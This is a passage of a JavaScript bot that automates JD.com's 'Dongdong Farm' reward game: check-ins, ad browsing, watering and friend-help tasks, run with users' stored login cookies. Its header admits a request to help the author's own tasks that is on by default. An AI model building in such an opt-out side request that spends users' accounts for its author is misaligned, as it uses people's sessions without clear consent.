/*
东东水果:脚本更新地址 https://gitee.com/lxk0301/jd_scripts/raw/master/jd_fruit.js
更新时间：2021-1-9
活动入口：京东APP我的-更多工具-东东农场
东东农场活动链接：https://h5.m.jd.com/babelDiy/Zeus/3KSjXqQabiTuD1cJ28QskrpWoBKT/index.html
脚本内置了一个给作者任务助力的网络请求，默认开启，如介意请自行关闭。
参数 helpAuthor = false
脚本作者：lxk0301
*/
const $ = new Env('东东农场');
let cookiesArr = [], cookie = '', jdFruitShareArr = [], isBox = false, notify, newShareCodes, allMessage = '';
//助力好友分享码(最多4个,否则后面的助力失败),原因:京东农场每人每天只有四次助力机会
//此此内容是IOS用户下载脚本到本地使用，填写互助码的地方，同一京东账号的好友互助码请使用@符号隔开。
//下面给出两个账号的填写示例（iOS只支持2个京东账号）
let shareCodes = [ // 这个列表填入你要助力的好友的shareCode
   //账号一的好友shareCode,不同好友的shareCode中间用@符号隔开
  '',
  //账号二的好友shareCode,不同好友的shareCode中间用@符号隔开
  '',
]
let message = '', subTitle = '', option = {}, isFruitFinished = false;
const retainWater = 100;//保留水滴大于多少g,默认100g;
let jdNotify = false;//是否关闭通知，false打开通知推送，true关闭通知推送
let jdFruitBeanCard = false;//农场使用水滴换豆卡(如果出现限时活动时100g水换20豆,此时比浇水划算,推荐换豆),true表示换豆(不浇水),false表示不换豆(继续浇水),脚本默认是浇水
let randomCount = $.isNode() ? 20 : 5;
let helpAuthor = true;
const JD_API_HOST = 'https://api.m.jd.com/client.action';
const urlSchema = `openjd://virtual?params=%7B%20%22category%22:%20%22jump%22,%20%22des%22:%20%22m%22,%20%22url%22:%20%22https://h5.m.jd.com/babelDiy/Zeus/3KSjXqQabiTuD1cJ28QskrpWoBKT/index.html%22%20%7D`;
!(async () => {
  await requireConfig();
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      await TotalBean();
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      message = '';
      subTitle = '';
      option = {};
      await shareCodesFormat();
      await jdFruit();

    }
  }
  if ($.isNode() && allMessage && $.ctrTemp) {
    await notify.sendNotify(`${$.name}`, `${allMessage}`)
  }
})()
    .catch((e) => {
      $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
    })
    .finally(() => {
      $.done();
    })
async function jdFruit() {
  subTitle = `【京东账号${$.index}】${$.nickName}`;
  try {
    if(helpAuthor){
      await shuye72()
    }
    await initForFarm();
    if ($.farmInfo.farmUserPro) {
      // option['media-url'] = $.farmInfo.farmUserPro.goodsImage;
      message = `【水果名称】${$.farmInfo.farmUserPro.name}\n`;
      console.log(`\n【京东账号${$.index}（${$.nickName || $.UserName}）的${$.name}好友互助码】${$.farmInfo.farmUserPro.shareCode}\n`);
      console.log(`\n【已成功兑换水果】${$.farmInfo.farmUserPro.winTimes}次\n`);
      message += `【已兑换水果】${$.farmInfo.farmUserPro.winTimes}次\n`;
      await masterHelpShare();//助力好友
      if ($.farmInfo.treeState === 2 || $.farmInfo.treeState === 3) {
        option['open-url'] = urlSchema;
        $.msg($.name, ``, `【京东账号${$.index}】${$.nickName || $.UserName}\n【提醒⏰】${$.farmInfo.farmUserPro.name}已可领取\n请去京东APP或微信小程序查看\n点击弹窗即达`, option);
        if ($.isNode()) {
          await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}水果已可领取`, `【京东账号${$.index}】${$.nickName || $.UserName}\n【提醒⏰】${$.farmInfo.farmUserPro.name}已可领取\n请去京东APP或微信小程序查看`);
        }
        return
      } else if ($.farmInfo.treeState === 1) {
        console.log(`\n${$.farmInfo.farmUserPro.name}种植中...\n`)
      } else if ($.farmInfo.treeState === 0) {
        //已下单购买, 但未开始种植新的水果
        option['open-url'] = urlSchema;
        $.msg($.name, ``, `【京东账号${$.index}】 ${$.nickName || $.UserName}\n【提醒⏰】您忘了种植新的水果\n请去京东APP或微信小程序选购并种植新的水果\n点击弹窗即达`, option);
        if ($.isNode()) {
          await notify.sendNotify(`${$.name} - 您忘了种植新的水果`, `京东账号${$.index} ${$.nickName}\n【提醒⏰】您忘了种植新的水果\n请去京东APP或微信小程序选购并种植新的水果`);
        }
        return
      }
      await doDailyTask();
      await doTenWater();//浇水十次
      await getFirstWaterAward();//领取首次浇水奖励
      await getTenWaterAward();//领取10浇水奖励
      await getWaterFriendGotAward();//领取为2好友浇水奖励
      await duck();
      await doTenWaterAgain();//再次浇水
      await predictionFruit();//预测水果成熟时间
    } else {
      console.log(`初始化农场数据异常, 请登录京东 app查看农场0元水果功能是否正常,农场初始化数据: ${JSON.stringify($.farmInfo)}`);
      message = `【数据异常】请手动登录京东app查看此账号${$.name}是否正常`;
    }
  } catch (e) {
    console.log(`任务执行异常，请检查执行日志 ‼️‼️`);
    message = `任务执行异常，请检查执行日志 ‼️‼️`;
    $.logErr(e);
  }
  await showMsg();
}
async function doDailyTask() {
  await taskInitForFarm();
  console.log(`开始签到`);
  if (!$.farmTask.signInit.todaySigned) {
    await signForFarm(); //签到
    if ($.signResult.code === "0") {
      console.log(`【签到成功】获得${$.signResult.amount}g💧\\n`)
      //message += `【签到成功】获得${$.signResult.amount}g💧\n`//连续签到${signResult.signDay}天
    } else {
      // message += `签到失败,详询日志\n`;
      console.log(`签到结果:  ${JSON.stringify($.signResult)}`);
    }
  } else {
    console.log(`今天已签到,连续签到${$.farmTask.signInit.totalSigned},下次签到可得${$.farmTask.signInit.signEnergyEachAmount}g\n`);
  }
  // 被水滴砸中
  console.log(`被水滴砸中： ${$.farmInfo.todayGotWaterGoalTask.canPop ? '是' : '否'}`);
  if ($.farmInfo.todayGotWaterGoalTask.canPop) {
    await gotWaterGoalTaskForFarm();
    if ($.goalResult.code === '0') {
      console.log(`【被水滴砸中】获得${$.goalResult.addEnergy}g💧\\n`);
      // message += `【被水滴砸中】获得${$.goalResult.addEnergy}g💧\n`
    }
  }
  console.log(`签到结束,开始广告浏览任务`);
  if (!$.farmTask.gotBrowseTaskAdInit.f) {
    let adverts = $.farmTask.gotBrowseTaskAdInit.userBrowseTaskAds
    let browseReward = 0
    let browseSuccess = 0
    let browseFail = 0
    for (let advert of adverts) { //开始浏览广告
      if (advert.limit <= advert.hadFinishedTimes) {
        // browseReward+=advert.reward
        console.log(`${advert.mainTitle}+ ' 已完成`);//,获得${advert.reward}g
        continue;
      }
      console.log('正在进行广告浏览任务: ' + advert.mainTitle);
      await browseAdTaskForFarm(advert.advertId, 0);
      if ($.browseResult.code === '0') {
        console.log(`${advert.mainTitle}浏览任务完成`);
        //领取奖励
        await browseAdTaskForFarm(advert.advertId, 1);
        if ($.browseRwardResult.code === '0') {
          console.log(`领取浏览${advert.mainTitle}广告奖励成功,获得${$.browseRwardResult.amount}g`)
          browseReward += $.browseRwardResult.amount
          browseSuccess++
        } else {
          browseFail++
          console.log(`领取浏览广告奖励结果:  ${JSON.stringify($.browseRwardResult)}`)
        }
      } else {
        browseFail++
        console.log(`广告浏览任务结果:   ${JSON.stringify($.browseResult)}`);
      }
    }
    if (browseFail > 0) {
      console.log(`【广告浏览】完成${browseSuccess}个,失败${browseFail},获得${browseReward}g💧\\n`);
      // message += `【广告浏览】完成${browseSuccess}个,失败${browseFail},获得${browseReward}g💧\n`;
    } else {
      console.log(`【广告浏览】完成${browseSuccess}个,获得${browseReward}g💧\n`);
      // message += `【广告浏览】完成${browseSuccess}个,获得${browseReward}g💧\n`;
    }
  } else {
    console.log(`今天已经做过浏览广告任务\n`);
  }
  //定时领水
  if (!$.farmTask.gotThreeMealInit.f) {
    //
    await gotThreeMealForFarm();
    if ($.threeMeal.code === "0") {
      console.log(`【定时领水】获得${$.threeMeal.amount}g💧\n`);
      // message += `【定时领水】获得${$.threeMeal.amount}g💧\n`;
    } else {
      // message += `【定时领水】失败,详询日志\n`;
      console.log(`定时领水成功结果:  ${JSON.stringify($.threeMeal)}`);
    }
  } else {
    console.log('当前不在定时领水时间断或者已经领过\n')
  }
  //给好友浇水
  if (!$.farmTask.waterFriendTaskInit.f) {
    if ($.farmTask.waterFriendTaskInit.waterFriendCountKey < $.farmTask.waterFriendTaskInit.waterFriendMax) {
      await doFriendsWater();
    }
  } else {
    console.log(`给${$.farmTask.waterFriendTaskInit.waterFriendMax}个好友浇水任务已完成\n`)
  }
  // await Promise.all([
  //   clockInIn(),//打卡领水
  //   executeWaterRains(),//水滴雨
  //   masterHelpShare(),//助力好友
  //   getExtraAward(),//领取额外水滴奖励
  //   turntableFarm()//天天抽奖得好礼
  // ])
  await getAwardInviteFriend();
  await clockInIn();//打卡领水
  await executeWaterRains();//水滴雨
  await getExtraAward();//领取额外水滴奖励
  await turntableFarm()//天天抽奖得好礼
}
async function predictionFruit() {
  console.log('开始预测水果成熟时间\n');
  await initForFarm();
  await taskInitForFarm();
  let waterEveryDayT = $.farmTask.totalWaterTaskInit.totalWaterTaskTimes;//今天到到目前为止，浇了多少次水
  message += `【今日共浇水】${waterEveryDayT}次\n`;
  message += `【剩余 水滴】${$.farmInfo.farmUserPro.totalEnergy}g💧\n`;
  message += `【水果🍉进度】${(($.farmInfo.farmUserPro.treeEnergy / $.farmInfo.farmUserPro.treeTotalEnergy) * 100).toFixed(2)}%，已浇水${$.farmInfo.farmUserPro.treeEnergy / 10}次,还需${($.farmInfo.farmUserPro.treeTotalEnergy - $.farmInfo.farmUserPro.treeEnergy) / 10}次\n`
  if ($.farmInfo.toFlowTimes > ($.farmInfo.farmUserPro.treeEnergy / 10)) {
    message += `【开花进度】再浇水${$.farmInfo.toFlowTimes - $.farmInfo.farmUserPro.treeEnergy / 10}次开花\n`
  } else if ($.farmInfo.toFruitTimes > ($.farmInfo.farmUserPro.treeEnergy / 10)) {
    message += `【结果进度】再浇水${$.farmInfo.toFruitTimes - $.farmInfo.farmUserPro.treeEnergy / 10}次结果\n`
  }
  // 预测n天后水果课可兑换功能
  let waterTotalT = ($.farmInfo.farmUserPro.treeTotalEnergy - $.farmInfo.farmUserPro.treeEnergy - $.farmInfo.farmUserPro.totalEnergy) / 10;//一共还需浇多少次水

  let waterD = Math.ceil(waterTotalT / waterEveryDayT);

  message += `【预测】${waterD === 1 ? '明天' : waterD === 2 ? '后天' : waterD + '天之后'}(${timeFormat(24 * 60 * 60 * 1000 * waterD + Date.now())}日)可兑换水果🍉`
}
//浇水十次
async function doTenWater() {
  jdFruitBeanCard = $.getdata('jdFruitBeanCard') ? $.getdata('jdFruitBeanCard') : jdFruitBeanCard;
  if ($.isNode() && process.env.FRUIT_BEAN_CARD) {
    jdFruitBeanCard = process.env.FRUIT_BEAN_CARD;
  }
  await myCardInfoForFarm();
  const { fastCard, doubleCard, beanCard, signCard  } = $.myCardInfoRes;
  if (`${jdFruitBeanCard}` === 'true' && JSON.stringify($.myCardInfoRes).match(`限时翻倍`) && beanCard > 0) {
    console.log(`您设置的是使用水滴换豆卡，且背包有水滴换豆卡${beanCard}张, 跳过10次浇水任务`)
    return
  }
  if ($.farmTask.totalWaterTaskInit.totalWaterTaskTimes < $.farmTask.totalWaterTaskInit.totalWaterTaskLimit) {
    console.log(`\n准备浇水十次`);
    let waterCount = 0;
    isFruitFinished = false;
    for (; waterCount < $.farmTask.totalWaterTaskInit.totalWaterTaskLimit - $.farmTask.totalWaterTaskInit.totalWaterTaskTimes; waterCount++) {
      console.log(`第${waterCount + 1}次浇水`);
      await waterGoodForFarm();
      console.log(`本次浇水结果:   ${JSON.stringify($.waterResult)}`);
      if ($.waterResult.code === '0') {
        console.log(`剩余水滴${$.waterResult.totalEnergy}g`);
        if ($.waterResult.finished) {
          // 已证实，waterResult.finished为true，表示水果可以去领取兑换了
          isFruitFinished = true;
          break
        } else {
          if ($.waterResult.totalEnergy < 10) {
            console.log(`水滴不够，结束浇水`)
            break
          }
          await gotStageAward();//领取阶段性水滴奖励
        }
      } else {
        console.log('浇水出现失败异常,跳出不在继续浇水')
        break;
      }
    }
    if (isFruitFinished) {
      option['open-url'] = urlSchema;
      $.msg($.name, ``, `【京东账号${$.index}】${$.nickName || $.UserName}\n【提醒⏰】${$.farmInfo.farmUserPro.name}已可领取\n请去京东APP或微信小程序查看\n点击弹窗即达`, option);
      $.done();
      if ($.isNode()) {
        await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName || $.UserName}水果已可领取`, `京东账号${$.index} ${$.nickName}\n${$.farmInfo.farmUserPro.name}已可领取`);
      }
    }
  } else {
    console.log('\n今日已完成10次浇水任务\n');
  }
}
//领取首次浇水奖励
async function getFirstWaterAward() {
  await taskInitForFarm();
  //领取首次浇水奖励
  if (!$.farmTask.firstWaterInit.f && $.farmTask.firstWaterInit.totalWaterTimes > 0) {
    await firstWaterTaskForFarm();
    if ($.firstWaterReward.code === '0') {
      console.log(`【首次浇水奖励】获得${$.firstWaterReward.amount}g💧\n`);
      // message += `【首次浇水奖励】获得${$.firstWaterReward.amount}g💧\n`;
    } else {
      // message += '【首次浇水奖励】领取奖励失败,详询日志\n';
      console.log(`领取首次浇水奖励结果:  ${JSON.stringify($.firstWaterReward)}`);
    }
  } else {
    console.log('首次浇水奖励已领取\n')
  }
}
//领取十次浇水奖励
async function getTenWaterAward() {
  //领取10次浇水奖励
  if (!$.farmTask.totalWaterTaskInit.f && $.farmTask.totalWaterTaskInit.totalWaterTaskTimes >= $.farmTask.totalWaterTaskInit.totalWaterTaskLimit) {
    await totalWaterTaskForFarm();
    if ($.totalWaterReward.code === '0') {
      console.log(`【十次浇水奖励】获得${$.totalWaterReward.totalWaterTaskEnergy}g💧\n`);
      // message += `【十次浇水奖励】获得${$.totalWaterReward.totalWaterTaskEnergy}g💧\n`;
    } else {
      // message += '【十次浇水奖励】领取奖励失败,详询日志\n';
      console.log(`领取10次浇水奖励结果:  ${JSON.stringify($.totalWaterReward)}`);
    }
  } else if ($.farmTask.totalWaterTaskInit.totalWaterTaskTimes < $.farmTask.totalWaterTaskInit.totalWaterTaskLimit) {
    // message += `【十次浇水奖励】任务未完成，今日浇水${$.farmTask.totalWaterTaskInit.totalWaterTaskTimes}次\n`;
    console.log(`【十次浇水奖励】任务未完成，今日浇水${$.farmTask.totalWaterTaskInit.totalWaterTaskTimes}次\n`);
  }
  console.log('finished 水果任务完成!');
}
//再次浇水
async function doTenWaterAgain() {
  console.log('开始检查剩余水滴能否再次浇水再次浇水\n');
  await initForFarm();
  let totalEnergy  = $.farmInfo.farmUserPro.totalEnergy;
  console.log(`剩余水滴${totalEnergy}g\n`);
  await myCardInfoForFarm();
  const { fastCard, doubleCard, beanCard, signCard  } = $.myCardInfoRes;
  console.log(`背包已有道具:\n快速浇水卡:${fastCard === -1 ? '未解锁': fastCard + '张'}\n水滴翻倍卡:${doubleCard === -1 ? '未解锁': doubleCard + '张'}\n水滴换京豆卡:${beanCard === -1 ? '未解锁' : beanCard + '张'}\n加签卡:${signCard === -1 ? '未解锁' : signCard + '张'}\n`)
  if (totalEnergy >= 100 && doubleCard > 0) {
    //使用翻倍水滴卡
    for (let i = 0; i < new Array(doubleCard).fill('').length; i++) {
      await userMyCardForFarm('doubleCard');
      console.log(`使用翻倍水滴卡结果:${JSON.stringify($.userMyCardRes)}`);
    }
    await initForFarm();
    totalEnergy = $.farmInfo.farmUserPro.totalEnergy;
  }
  if (signCard > 0) {
    //使用加签卡
    for (let i = 0; i < new Array(signCard).fill('').length; i++) {
      await userMyCardForFarm('signCard');
      console.log(`使用加签卡结果:${JSON.stringify($.userMyCardRes)}`);
    }
    await initForFarm();
    totalEnergy = $.farmInfo.farmUserPro.totalEnergy;
  }
  jdFruitBeanCard = $.getdata('jdFruitBeanCard') ? $.getdata('jdFruitBeanCard') : jdFruitBeanCard;
  if ($.isNode() && process.env.FRUIT_BEAN_CARD) {
    jdFruitBeanCard = process.env.FRUIT_BEAN_CARD;
  }
  if (`${jdFruitBeanCard}` === 'true' && JSON.stringify($.myCardInfoRes).match('限时翻倍')) {
    console.log(`\n您设置的是水滴换豆功能,现在为您换豆`);
    if (totalEnergy >= 100 && $.myCardInfoRes.beanCard > 0) {
      //使用水滴换豆卡
      await userMyCardForFarm('beanCard');
      console.log(`使用水滴换豆卡结果:${JSON.stringify($.userMyCardRes)}`);
      if ($.userMyCardRes.code === '0') {
        message += `【水滴换豆卡】获得${$.userMyCardRes.beanCount}个京豆\n`;
        return
      }
    } else {
      console.log(`您目前水滴:${totalEnergy}g,水滴换豆卡${$.myCardInfoRes.beanCard}张,暂不满足水滴换豆的条件,为您继续浇水`)
    }
  }
  // if (totalEnergy > 100 && $.myCardInfoRes.fastCard > 0) {
  //   //使用快速浇水卡
  //   await userMyCardForFarm('fastCard');
  //   console.log(`使用快速浇水卡结果:${JSON.stringify($.userMyCardRes)}`);
  //   if ($.userMyCardRes.code === '0') {
  //     console.log(`已使用快速浇水卡浇水${$.userMyCardRes.waterEnergy}g`);
  //   }
  //   await initForFarm();
  //   totalEnergy  = $.farmInfo.farmUserPro.totalEnergy;
  // }
  // 所有的浇水(10次浇水)任务，获取水滴任务完成后，如果剩余水滴大于等于60g,则继续浇水(保留部分水滴是用于完成第二天的浇水10次的任务)
  let overageEnergy = totalEnergy - retainWater;
  if (totalEnergy >= ($.farmInfo.farmUserPro.treeTotalEnergy - $.farmInfo.farmUserPro.treeEnergy)) {
    //如果现有的水滴，大于水果可兑换所需的对滴(也就是把水滴浇完，水果就能兑换了)
    isFruitFinished = false;
    for (let i = 0; i < ($.farmInfo.farmUserPro.treeTotalEnergy - $.farmInfo.farmUserPro.treeEnergy) / 10; i++) {
      await waterGoodForFarm();
      console.log(`本次浇水结果(水果马上就可兑换了):   ${JSON.stringify($.waterResult)}`);
      if ($.waterResult.code === '0') {
        console.log('\n浇水10g成功\n');
        if ($.waterResult.finished) {
          // 已证实，waterResult.finished为true，表示水果可以去领取兑换了
          isFruitFinished = true;
          break
        } else {
          console.log(`目前水滴【${$.waterResult.totalEnergy}】g,继续浇水，水果马上就可以兑换了`)
        }
      } else {
        console.log('浇水出现失败异常,跳出不在继续浇水')
        break;
      }
    }
    if (isFruitFinished) {
      option['open-url'] = urlSchema;
      $.msg($.name, ``, `【京东账号${$.index}】${$.nickName || $.UserName}\n【提醒⏰】${$.farmInfo.farmUserPro.name}已可领取\n请去京东APP或微信小程序查看\n点击弹窗即达`, option);
      $.done();
      if ($.isNode()) {
        await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}水果已可领取`, `京东账号${$.index} ${$.nickName}\n${$.farmInfo.farmUserPro.name}已可领取`);
      }
    }
  } else if (overageEnergy >= 10) {
    console.log("目前剩余水滴：【" + totalEnergy + "】g，可继续浇水");
    isFruitFinished = false;
    for (let i = 0; i < parseInt(overageEnergy / 10); i++) {
      await waterGoodForFarm();
      console.log(`本次浇水结果:   ${JSON.stringify($.waterResult)}`);
      if ($.waterResult.code === '0') {
        console.log(`\n浇水10g成功,剩余${$.waterResult.totalEnergy}\n`)
        if ($.waterResult.finished) {
          // 已证实，waterResult.finished为true，表示水果可以去领取兑换了
          isFruitFinished = true;
          break
        } else {
          await gotStageAward()
        }
      } else {
        console.log('浇水出现失败异常,跳出不在继续浇水')
        break;
      }
    }
    if (isFruitFinished) {
      option['open-url'] = urlSchema;
      $.msg($.name, ``, `【京东账号${$.index}】${$.nickName || $.UserName}\n【提醒⏰】${$.farmInfo.farmUserPro.name}已可领取\n请去京东APP或微信小程序查看\n点击弹窗即达`, option);
      $.done();
      if ($.isNode()) {
        await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}水果已可领取`, `京东账号${$.index} ${$.nickName}\n${$.farmInfo.farmUserPro.name}已可领取`);
      }
    }
  } else {
    console.log("目前剩余水滴：【" + totalEnergy + "】g,不再继续浇水,保留部分水滴用于完成第二天【十次浇水得水滴】任务")
  }
}
//领取阶段性水滴奖励
function gotStageAward() {
  return new Promise(async resolve => {
    if ($.waterResult.waterStatus === 0 && $.waterResult.treeEnergy === 10) {
      console.log('果树发芽了,奖励30g水滴');
      await gotStageAwardForFarm('1');
      console.log(`浇水阶段奖励1领取结果 ${JSON.stringify($.gotStageAwardForFarmRes)}`);
      if ($.gotStageAwardForFarmRes.code === '0') {
        // message += `【果树发芽了】奖励${$.gotStageAwardForFarmRes.addEnergy}\n`;
        console.log(`【果树发芽了】奖励${$.gotStageAwardForFarmRes.addEnergy}\n`);
      }
    } else if ($.waterResult.waterStatus === 1) {
      console.log('果树开花了,奖励40g水滴');
      await gotStageAwardForFarm('2');
      console.log(`浇水阶段奖励2领取结果 ${JSON.stringify($.gotStageAwardForFarmRes)}`);
      if ($.gotStageAwardForFarmRes.code === '0') {
        // message += `【果树开花了】奖励${$.gotStageAwardForFarmRes.addEnergy}g💧\n`;
        console.log(`【果树开花了】奖励${$.gotStageAwardForFarmRes.addEnergy}g💧\n`);
      }
    } else if ($.waterResult.waterStatus === 2) {
      console.log('果树长出小果子啦, 奖励50g水滴');
      await gotStageAwardForFarm('3');
      console.log(`浇水阶段奖励3领取结果 ${JSON.stringify($.gotStageAwardForFarmRes)}`)
      if ($.gotStageAwardForFarmRes.code === '0') {
        // message += `【果树结果了】奖励${$.gotStageAwardForFarmRes.addEnergy}g💧\n`;
        console.log(`【果树结果了】奖励${$.gotStageAwardForFarmRes.addEnergy}g💧\n`);
      }
    }
    resolve()
  })
}
//天天抽奖活动
async function turntableFarm() {
  await initForTurntableFarm();
  if ($.initForTurntableFarmRes.code === '0') {
    //领取定时奖励 //4小时一次
    let {timingIntervalHours, timingLastSysTime, sysTime, timingGotStatus, remainLotteryTimes, turntableInfos} = $.initForTurntableFarmRes;

    if (!timingGotStatus) {
      console.log(`是否到了领取免费赠送的抽奖机会----${sysTime > (timingLastSysTime + 60*60*timingIntervalHours*1000)}`)
      if (sysTime > (timingLastSysTime + 60*60*timingIntervalHours*1000)) {
        await timingAwardForTurntableFarm();
        console.log(`领取定时奖励结果${JSON.stringify($.timingAwardRes)}`);
        await initForTurntableFarm();
        remainLotteryTimes = $.initForTurntableFarmRes.remainLotteryTimes;
      } else {
        console.log(`免费赠送的抽奖机会未到时间`)
      }
    } else {
      console.log('4小时候免费赠送的抽奖机会已领取')
    }
    if ($.initForTurntableFarmRes.turntableBrowserAds && $.initForTurntableFarmRes.turntableBrowserAds.length > 0) {
      for (let index = 0; index < $.initForTurntableFarmRes.turntableBrowserAds.length; index++) {
        if (!$.initForTurntableFarmRes.turntableBrowserAds[index].status) {
          console.log(`开始浏览天天抽奖的第${index + 1}个逛会场任务`)
          await browserForTurntableFarm(1, $.initForTurntableFarmRes.turntableBrowserAds[index].adId);
          if ($.browserForTurntableFarmRes.code === '0' && $.browserForTurntableFarmRes.status) {
            console.log(`第${index + 1}个逛会场任务完成，开始领取水滴奖励\n`)
            await browserForTurntableFarm(2, $.initForTurntableFarmRes.turntableBrowserAds[index].adId);
            if ($.browserForTurntableFarmRes.code === '0') {
              console.log(`第${index + 1}个逛会场任务领取水滴奖励完成\n`)
              await initForTurntableFarm();
              remainLotteryTimes = $.initForTurntableFarmRes.remainLotteryTimes;
            }
          }
        } else {
          console.log(`浏览天天抽奖的第${index + 1}个逛会场任务已完成`)
        }
      }
    }
    //天天抽奖助力
    console.log('开始天天抽奖--好友助力--每人每天只有三次助力机会.')
    for (let code of newShareCodes) {
      if (code === $.farmInfo.farmUserPro.shareCode) {
        console.log('天天抽奖-不能自己给自己助力\n')
        continue
      }
      await lotteryMasterHelp(code);
      // console.log('天天抽奖助力结果',lotteryMasterHelpRes.helpResult)
      if ($.lotteryMasterHelpRes.helpResult.code === '0') {
        console.log(`天天抽奖-助力${$.lotteryMasterHelpRes.helpResult.masterUserInfo.nickName}成功\n`)
      } else if ($.lotteryMasterHelpRes.helpResult.code === '11') {
        console.log(`天天抽奖-不要重复助力${$.lotteryMasterHelpRes.helpResult.masterUserInfo.nickName}\n`)
      } else if ($.lotteryMasterHelpRes.helpResult.code === '13') {
        console.log(`天天抽奖-助力${$.lotteryMasterHelpRes.helpResult.masterUserInfo.nickName}失败,助力次数耗尽\n`);
        break;
      }
    }
    console.log(`---天天抽奖次数remainLotteryTimes----${remainLotteryTimes}次`)
    //抽奖
    if (remainLotteryTimes > 0) {
      console.log('开始抽奖')
      let lotteryResult = '';
      for (let i = 0; i < new Array(remainLotteryTimes).fill('').length; i++) {
        await lotteryForTurntableFarm()
        console.log(`第${i + 1}次抽奖结果${JSON.stringify($.lotteryRes)}`);
        if ($.lotteryRes.code === '0') {
          turntableInfos.map((item) => {
            if (item.type === $.lotteryRes.type) {
              console.log(`lotteryRes.type${$.lotteryRes.type}`);
              if ($.lotteryRes.type.match(/bean/g) && $.lotteryRes.type.match(/bean/g)[0] === 'bean') {
                lotteryResult += `${item.name}个，`;
              } else if ($.lotteryRes.type.match(/water/g) && $.lotteryRes.type.match(/water/g)[0] === 'water') {
                lotteryResult += `${item.name}，`;
              } else {
                lotteryResult += `${item.name}，`;
              }
            }
          })
          //没有次数了
          if ($.lotteryRes.remainLotteryTimes === 0) {
            break
          }
        }
      }
      if (lotteryResult) {
        console.log(`【天天抽奖】${lotteryResult.substr(0, lotteryResult.length - 1)}\n`)
        // message += `【天天抽奖】${lotteryResult.substr(0, lotteryResult.length - 1)}\n`;
      }
    }  else {
      console.log('天天抽奖--抽奖机会为0次')
    }
  } else {
    console.log('初始化天天抽奖得好礼失败')
  }
}
//领取额外奖励水滴
async function getExtraAward() {
  await masterHelpTaskInitForFarm();
  if ($.masterHelpResult.code === '0') {
    if ($.masterHelpResult.masterHelpPeoples && $.masterHelpResult.masterHelpPeoples.length >= 5) {
      // 已有五人助力。领取助力后的奖励
      if (!$.masterHelpResult.masterGotFinal) {
        await masterGotFinishedTaskForFarm();
        if ($.masterGotFinished.code === '0') {
          console.log(`已成功领取好友助力奖励：【${$.masterGotFinished.amount}】g水`);
          message += `【额外奖励】${$.masterGotFinished.amount}g水领取成功\n`;
        }
      } else {
        console.log("已经领取过5好友助力额外奖励");
        message += `【额外奖励】已被领取过\n`;
      }
    } else {
      console.log("助力好友未达到5个");
      message += `【额外奖励】领取失败,原因：给您助力的人未达5个\n`;
    }
    if ($.masterHelpResult.masterHelpPeoples && $.masterHelpResult.masterHelpPeoples.length > 0) {
      let str = '';
      $.masterHelpResult.masterHelpPeoples.map((item, index) => {
        if (index === ($.masterHelpResult.masterHelpPeoples.length - 1)) {
          str += item.nickName || "匿名用户";
        } else {
          str += (item.nickName || "匿名用户") + ',';
        }
        let date = new Date(item.time);
        let time = date.getFullYear() + '-' + (date.getMonth() + 1) + '-' + date.getDate() + ' ' + date.getHours() + ':' + date.getMinutes() + ':' + date.getMinutes();
        console.log(`\n京东昵称【${item.nickName || "匿名用户"}】 在 ${time} 给您助过力\n`);
      })
      message += `【助力您的好友】${str}\n`;
    }
    console.log('领取额外奖励水滴结束\n');
  }
}
//助力好友
async function masterHelpShare() {
  console.log('开始助力好友')
  let salveHelpAddWater = 0;
  let remainTimes = 4;//今日剩余助力次数,默认4次（京东农场每人每天4次助力机会）。
  let helpSuccessPeoples = '';//成功助力好友
  console.log(`格式化后的助力码::${JSON.stringify(newShareCodes)}\n`);

  for (let code of newShareCodes) {
    console.log(`开始助力京东账号${$.index} - ${$.nickName}的好友: ${code}`);
    if (!code) continue;
    if (code === $.farmInfo.farmUserPro.shareCode) {
      console.log('不能为自己助力哦，跳过自己的shareCode\n')
      continue
    }
    await masterHelp(code);
    if ($.helpResult.code === '0') {
      if ($.helpResult.helpResult.code === '0') {
        //助力成功
        salveHelpAddWater += $.helpResult.helpResult.salveHelpAddWater;
        console.log(`【助力好友结果】: 已成功给【${$.helpResult.helpResult.masterUserInfo.nickName}】助力`);
        console.log(`给好友【${$.helpResult.helpResult.masterUserInfo.nickName}】助力获得${$.helpResult.helpResult.salveHelpAddWater}g水滴`)
        helpSuccessPeoples += ($.helpResult.helpResult.masterUserInfo.nickName || '匿名用户') + ',';
      } else if ($.helpResult.helpResult.code === '8') {
        console.log(`【助力好友结果】: 助力【${$.helpResult.helpResult.masterUserInfo.nickName}】失败，您今天助力次数已耗尽`);
      } else if ($.helpResult.helpResult.code === '9') {
        console.log(`【助力好友结果】: 之前给【${$.helpResult.helpResult.masterUserInfo.nickName}】助力过了`);
      } else if ($.helpResult.helpResult.code === '10') {
        console.log(`【助力好友结果】: 好友【${$.helpResult.helpResult.masterUserInfo.nickName}】已满五人助力`);
      } else {
        console.log(`助力其他情况：${JSON.stringify($.helpResult.helpResult)}`);
      }
      console.log(`【今日助力次数还剩】${$.helpResult.helpResult.remainTimes}次\n`);
      remainTimes = $.helpResult.helpResult.remainTimes;
      if ($.helpResult.helpResult.remainTimes === 0) {
        console.log(`您当前助力次数已耗尽，跳出助力`);
        break
      }
    } else {
      console.log(`助力失败::${JSON.stringify($.helpResult)}`);
    }
  }
  if ($.isLoon() || $.isQuanX() || $.isSurge()) {
    let helpSuccessPeoplesKey = timeFormat() + $.farmInfo.farmUserPro.shareCode;
